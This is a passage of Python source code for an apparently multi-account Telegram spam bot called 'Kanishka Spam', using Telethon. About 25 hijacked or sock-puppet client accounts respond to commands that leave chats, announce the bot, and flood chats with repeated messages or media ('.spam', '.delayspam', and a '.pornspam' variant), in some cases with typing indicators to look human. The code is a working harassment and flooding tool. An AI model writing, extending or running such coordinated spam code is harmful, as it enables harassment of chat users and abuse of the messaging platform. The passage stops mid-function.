@ddk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.leave"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.leave"))

async def _(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗟𝗲𝗮𝘃𝗲\n\nCommand:\n\n.leave <Channel or Chat ID>"
    if e.sender_id in SMEX_USERS:
        ustad = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        if len(e.text) > 7:
            bc = ustad[0]
            bc = int(bc)
            text = "RUK RUK JAA RHA"
            event = await e.reply(text, parse_mode=None, link_preview=None )
            try:
                await event.client(LeaveChannelRequest(bc))
                await event.edit("YEH MERA GHAR NHI H RE SHAAM APNA GHAAR KIDHAR H RE")
            except Exception as e:
                await event.edit(str(e))   
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

USTAD_PIC = "https://telegra.ph/file/7a0e3814496a14d516c31.jpg"
@idk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.alive"))
async def start(event):
    if event.sender_id in SMEX_USERS:
     await idk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await ydk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await wdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await hdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await sdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await adk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await bdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await cdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await edk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await hdk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await ddk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await vkk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await kkk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await lkk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\n𝐴𝐿𝐼𝐸𝑁 𝑋 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await mkk.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await sid.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await shy.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await aan.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await ake.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await eel.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await khu.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await shi.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await yaa.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await dav.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await raj.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\nKANISHKA SPAM 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )
     await put.send_file(event.chat_id,
                                  ALIVE_IMAGE,
                                  caption="✯ KANISHKA SPAM BOT IS  𝐻𝐸𝑅𝐸𝐸 ✯\n\n═══════════════════\n ME ZINDA HU RE BABA...⚡\n𝐴𝐿𝐼𝐸𝑁 𝑋 𝑉𝐸𝑅𝑆𝐼𝑂𝑁 :- 0.1\n 𝐶𝑅𝐸𝐴𝑇𝐸 𝑌𝑂𝑈𝑅 𝑂𝑊𝑁 𝐵𝑂𝑇 𝐶𝐿𝐼𝐶𝐾 𝐻𝐸𝑅𝐸 [KANISHKA SPAM](https://github.com/CoderXKrishna/Kanishka_Spam)...👻\n═══════════════════\n\n"                                
                              )        
@idk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.spam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗦𝗽𝗮𝗺\n\nCommand:\n\n.spam <count> <message to spam>\n\n.spam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )
            

@idk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.pornspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗣𝗼𝗥𝗡𝗦𝗽𝗮𝗺\n\nCommand:\n\n.pornspam <count> <message to spam>\n\n.pornspam <count> <reply to a message>\n\nCount must be a integer."
    error = "Spam Module can only be used till 100 count. For bigger spams use BigSpam."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        yukki = ("".join(e.text.split(maxsplit=1)[1:])).split(" ", 1)
        smex = await e.get_reply_message()
        if len(yukki) == 2:
            message = str(yukki[1])
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            for _ in range(counter):
                smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                await gifspam(e, smex)  
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukki[0])
            if counter > 100:
                return await e.reply(error, parse_mode=None, link_preview=None )
            await asyncio.wait([e.respond(message) for i in range(counter)])
        else:
            await e.reply(usage, parse_mode=None, link_preview=None )          
            
@idk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@ydk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@wdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@hdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@sdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@adk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@bdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@cdk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@edk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@ddk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@vkk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@kkk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@lkk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@mkk.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@sid.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@shy.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@aan.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@ake.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@eel.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@khu.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@shi.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@yaa.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@dav.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@raj.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
@put.on(events.NewMessage(incoming=True, pattern=r"\.delayspam"))
async def spam(e):
    usage = "𝗠𝗼𝗱𝘂𝗹𝗲 𝗡𝗮𝗺𝗲 = 𝗗𝗲𝗹𝗮𝘆𝗦𝗽𝗮𝗺\n\nCommand:\n\n.delayspam <sleep time> <count> <message to spam>\n\n.delayspam <sleep time> <count> <reply to a message>\n\nCount and Sleeptime must be a integer."
    if e.sender_id in SMEX_USERS:
        if e.text[0].isalpha() and e.text[0] in ("/", "#", "@", "!"):
            return await e.reply(usage, parse_mode=None, link_preview=None )
        smex = await e.get_reply_message()
        yukki = "".join(e.text.split(maxsplit=1)[1:]).split(" ", 2)
        yukkisexy = yukki[1:]
        if len(yukkisexy) == 2:
            message = str(yukkisexy[1])
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "typing"):
                    if e.reply_to_msg_id:
                        await smex.reply(message)
                    else:
                        await e.client.send_message(e.chat_id, message)
                    await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.media:  
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
                async with e.client.action(e.chat_id, "document"):
                    smex = await e.client.send_file(e.chat_id, smex, caption=smex.text)
                    await gifspam(e, smex) 
                await asyncio.sleep(sleeptime)
        elif e.reply_to_msg_id and smex.text:
            message = smex.text
            counter = int(yukkisexy[0])
            sleeptime = float(yukki[0])
            for _ in range(counter):
